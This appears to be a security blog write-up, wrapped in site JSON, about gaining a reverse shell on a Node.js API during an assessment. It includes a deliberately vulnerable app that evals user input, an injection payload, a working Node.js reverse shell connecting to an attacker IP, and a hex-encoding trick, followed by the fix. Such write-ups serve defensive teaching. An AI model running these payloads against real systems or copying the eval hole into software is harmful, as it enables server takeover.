{"componentChunkName":"component---src-templates-post-template-tsx","path":"/2016/05/reverse-shell-on-nodejs-application.html","result":{"data":{"markdownRemark":{"id":"25eb15f7-d5a2-50e4-b082-294f800da0e3","html":"<p>How we obtained a Javascript reverse shell by exploiting a vulnerability on a Node.js application during a security assessment.</p>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>We were tasked by a small web developer team to perform a security assessment of their mobile app backend which is a REST API.</p>\n<p>The architecture is rather simple there is only three Linux servers.</p>\n<ul>\n<li>Node.js</li>\n<li>MongoDB</li>\n<li>Redis</li>\n</ul>\n<p>First we performed a few arbitrary tests without access to the source code and we discovered that a few unexpected input at some endpoints would crash the backend application.\nWe also noticed that the redis server was accessible from the WAN without authentication.</p>\n<p>Our next step was to review the Node.js API code and understand the crashes.</p>\n<h2 id=\"simplified-vulnerable-application\" style=\"position:relative;\"><a href=\"#simplified-vulnerable-application\" aria-label=\"simplified vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Simplified vulnerable application</h2>\n<p>We created this small Node.js application with the vulnerable function if you want to try to exploit it yourself.\nThis Node.js web server will wait for a query such as <code class=\"language-text\">http://target.tld//?name=do*</code> and search for animal names matching that query.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">'use strict'\nconst http = require('http');\nconst url = require('url');\nconst path = require('path');\n\nconst animalsJSON = path.join(__dirname, 'animals.json');\nconst animals = require(animalsJSON);\n\nfunction requestHandler(req, res) {\n    let urlParams = url.parse(req.url, true);\n    let queryData = urlParams.query;\n    res.writeHead(200, {\"Content-Type\": \"application/json\"});\n\n    if (queryData.name) {\n        let searchQuery = stringToRegexp(queryData.name);\n        let animalsResult = getAnimals(searchQuery);\n        res.end(JSON.stringify(animalsResult));\n    } else {\n        res.end();\n    }\n}\n\nfunction getAnimals(query) {\n    let result = [];\n\n    for (let animal of animals) {\n        if (query.test(animal.name))\n            result.push(animal);\n    }\n\n    return result;\n}\n\nfunction stringToRegexp(input) {\n    let output = input.replace(/[\\[\\]\\\\\\^\\$\\.\\|\\?\\+\\(\\)]/, \"\\\\$&amp;\");\n    let prefix, suffix;\n\n    if (output[0] == '*') {\n        prefix = '/';\n        output = output.replace(/^\\*+/g, '');\n    } else {\n        prefix = '/^';\n    }\n\n    if (output[output.length - 1] == '*') {\n        suffix = '/i';\n        output = output.replace(/\\*+$/g, '');\n    } else {\n        suffix = '$/i';\n    }\n    output = output.replace(/[\\*]/, '.*');\n\n    return eval(prefix + output + suffix);\n}\n\nconst server = http.createServer(requestHandler);\nserver.listen(3000);</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[\n    {\"name\": \"Dinosaur\"},\n    {\"name\": \"Dog\"},\n    {\"name\": \"Dogfish\"},\n    {\"name\": \"Dolphin\"},\n    {\"name\": \"Donkey\"},\n    {\"name\": \"Dotterel\"},\n    {\"name\": \"Dove\"},\n    {\"name\": \"Dragonfly\"},\n    {\"name\": \"Duck\"}\n]</code></pre></div>\n<h2 id=\"the-vulnerability\" style=\"position:relative;\"><a href=\"#the-vulnerability\" aria-label=\"the vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The vulnerability</h2>\n<p>After a few minutes of analyzing the buggy endpoints in the code we noticed a bad practice issue that could lead to remote code execution.\nThe <code class=\"language-text\">stringToRegexp</code> function is evaluating user input to create a <code class=\"language-text\">RegExp</code> object and use it to find elements in an array.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">return eval(prefix + output + suffix); // we control output value</code></pre></div>\n<p>We can insert our own Javascript code in the output variable and execute it.\nThe stringToRegexp function will escape some characters and the output value will be evaluated.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[\"./;require('util').log('Owned');//*\"]</code></pre></div>\n<p>Visiting the address below will print a message on the server terminal.\n<code class=\"language-text\">http://target.tld/?name=[\"./;require('util').log('Owned');//*\"]</code></p>\n<p>From there it would be nice to execute code to have an interactive shell such as <code class=\"language-text\">/bin/sh</code>.</p>\n<h2 id=\"the-nodejs-reverse-shell\" style=\"position:relative;\"><a href=\"#the-nodejs-reverse-shell\" aria-label=\"the nodejs reverse shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The Node.js reverse shell</h2>\n<p>The Javascript code below is a Node.js reverse shell.\nThe payload will spawn a /bin/sh shell, create a TCP connection to the attacker and attach the shell standard streams to it.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(8080, \"10.17.26.64\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();</code></pre></div>\n<p>To execute the payload gracefully we used a little trick, we encoded our reverse shell payload to hexadecimal and used the Node.js Buffer object to decode it.\n<code class=\"language-text\">http://target.tld/?name=[\"./;eval(new Buffer('PAYLOAD', 'hex').toString());//*\"]</code></p>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>Itâ€™s highly recommended to avoid using the <code class=\"language-text\">eval</code> function in a Javascript project.\nThe fix was rather simple, they started using using the <code class=\"language-text\">RegExp</code> object directly.\nSee origin post here: <a href=\"https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/</a></p>","fields":{"slug":"/2016/05/reverse-shell-on-nodejs-application.html","tagSlugs":["/tag/nodejs/","/tag/reverse-shell/","/tag/security/","/tag/node-js/","/tag/vulnerable/"]},"frontmatter":{"date":"2016-05-30T23:12:00.000+07:00","description":"How we obtained a Javascript reverse shell by exploiting a vulnerability on a Node.js application during a security assessment.","tags":["Nodejs","Reverse shell","Security","Node.js","vulnerable"],"title":"Reverse shell on a Node.js application","fbCommentUrl":"none"}}},"pageContext":{"slug":"/2016/05/reverse-shell-on-nodejs-application.html"}},"staticQueryHashes":["251939775","2672868365","401334301"]}